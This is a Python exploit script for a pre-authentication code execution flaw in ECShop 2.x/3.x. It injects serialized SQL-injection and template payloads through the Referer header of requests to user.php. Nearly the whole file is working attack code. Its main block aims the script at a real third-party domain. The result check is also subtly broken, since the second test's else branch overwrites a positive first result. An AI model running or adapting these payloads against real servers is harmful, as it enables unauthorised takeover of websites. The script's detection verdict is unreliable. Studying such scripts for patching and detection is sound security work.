#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ecshop2.x 3.x代码执行漏洞
referer: https://www.freebuf.com/column/185049.html
author: qianxiao996
description: 该漏洞产生的根本原因在于ECShop系统的user.php文件中，
display函数的模板变量可控，导致注入，配合注入可达到远程代码执行的效果。
使得攻击者无需登录等操作，直接可以获得服务器的权限
'''

import sys
import requests
import warnings
def run(url):
    result = ['ecshop2.x 3.x代码执行漏洞', '', '']
    payload2 ='554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:110:"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -";s:2:"id";s:4:"\' /*";}554fcae493e564ee0dc75bdf2ebf94ca'
    headers2 = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        'Referer': payload2
    }
    payload3 = '45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1\' UNION/*";}45ea207d7a2b68c49582d2d22adf953a'
    headers3 = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        'Referer': payload3
    }
    url_path = url + "/user.php"
    try:
        result2 = requests.get(url_path, timeout=5,headers=headers2, verify=False)
        result3 = requests.get(url_path, timeout=5,headers=headers3, verify=False)
        # print(verify.text)
        if result2.status_code == 200 and 'code' in result2.text:
            result[2]=  '存在'
        if result3.status_code == 200 and 'code' in result3.text:
            result[2]=  '存在'
        else:
            result[2]=  '不存在'
    except Exception as e:
        # print (e)
        result[2]='不存在'
    return result
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run("http://baidu.com")

